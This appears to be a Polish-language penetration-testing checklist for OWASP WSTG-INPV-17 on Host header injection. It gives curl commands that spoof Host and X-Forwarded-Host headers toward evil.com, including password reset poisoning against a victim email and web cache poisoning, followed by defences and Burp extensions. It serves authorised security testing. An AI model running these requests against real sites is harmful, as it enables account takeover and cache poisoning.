# WSTG-INPV-17 — Testing for Host Header Injection

## Cele

- Assess if the Host header is being parsed dynamically in the application
- Bypass security controls that rely on the header

## KOMENDY

### Podstawowe Host header injection

```bash
curl -s "https://TARGET/" -H "Host: evil.com" -o /dev/null -w "%{http_code}\n"
curl -s "https://TARGET/" -H "Host: evil.com" | grep -i "evil.com"

```

### X-Forwarded-Host

```bash
curl -s "https://TARGET/" -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"

```

### Inne headery

```bash
curl -s "https://TARGET/" -H "X-Host: evil.com"
curl -s "https://TARGET/" -H "X-Original-URL: /admin"
curl -s "https://TARGET/" -H "X-Rewrite-URL: /admin"
curl -s "https://TARGET/" -H "X-Forwarded-Server: evil.com"

```

### Password reset poisoning

```bash
curl -X POST "https://TARGET/forgot-password" -d "email=victim@target.com" -H "Host: evil.com"
curl -X POST "https://TARGET/forgot-password" -d "email=victim@target.com" -H "X-Forwarded-Host: evil.com"

```

### Double Host header

```bash
curl -s "https://TARGET/" -H "Host: evil.com" -H "Host: TARGET"

```

### Host z portem

```bash
curl -s "https://TARGET/" -H "Host: TARGET:evil.com"

```

### Web cache poisoning via Host

```bash
curl -s "https://TARGET/static/page" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"

```

## KOMENDY Z WORDLISTAMI

### Brak dedykowanych wordlist - test logiczny

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Reverse Proxy Misconfigurations/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Sprawdz czy aplikacja generuje linki na podstawie Host headera
2. Testuj password reset poisoning
3. Sprawdz web cache poisoning via Host manipulation
4. Testuj dostep do zasobow wewnetrznych przez X-Original-URL
5. Sprawdz SSRF via Host header
6. Uzyj Burp Repeater do testowania roznych wariantow


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Forgot_Password_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### Host Header Injection — mechanizm

- Aplikacja dynamicznie generuje URL-e na podstawie naglowka **Host** z requestu
- Atakujacy zmienia Host header → linki w emailach, redirectach, cachowaniu zawieraja domena atakujacego
- Kluczowy atak: **password reset poisoning** — link resetu z domena atakujacego

### Password Reset Poisoning — przebieg

1. Atakujacy wysyla request reset hasla z `Host: evil.com` i `email=victim@target.com`
2. Serwer generuje link resetu: `https://evil.com/reset?token=SECRET`
3. Ofiara klika link w emailu → token trafia do atakujacego
4. Atakujacy uzywa tokenu na prawdziwym serwerze do resetu hasla

### Naglowki do testowania

| Naglowek | Przyklad |
|----------|---------|
| Host | `Host: evil.com` |
| X-Forwarded-Host | `X-Forwarded-Host: evil.com` |
| X-Host | `X-Host: evil.com` |
| X-Forwarded-Server | `X-Forwarded-Server: evil.com` |
| X-Original-URL | `X-Original-URL: /admin` |
| X-Rewrite-URL | `X-Rewrite-URL: /admin` |
| Podwojny Host | `Host: evil.com` + `Host: target.com` |
| Host z portem | `Host: target.com:evil.com` |

### Web Cache Poisoning via Host

- Zmien Host header → zatruta strona cachowana przez CDN/reverse proxy
- Wszystkie uzytkownicy dostaja zatruta wersje z linkami do evil.com
- Testuj: wyslij request z `Host: evil.com` do cachowanej strony, sprawdz czy nastepny request (bez manipulacji) zwraca zatruta wersje

### Obrona

- **NIE uzywaj Host header** do generowania URL-i — hardcoduj domene w konfiguracji
- Waliduj Host header na serwerze — allowlist dozwolonych domen
- Ignoruj X-Forwarded-Host i inne override headers (chyba ze z zaufanego proxy)
- Password reset: generuj linki z **hardcoded base URL** — nie z Host header
- Django: uzyj `ALLOWED_HOSTS`; Rails: `config.hosts`; Spring: whitelist hosts

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Host Header Inchecktion | Aktywne testowanie host header injection | [GitHub](https://github.com/fabianbinna/host_header_inchecktion) |
| Collaborator Everywhere | Wstrzykiwanie naglowkow do wykrywania SSRF/pingbackow | [GitHub](https://github.com/PortSwigger/collaborator-everywhere) |
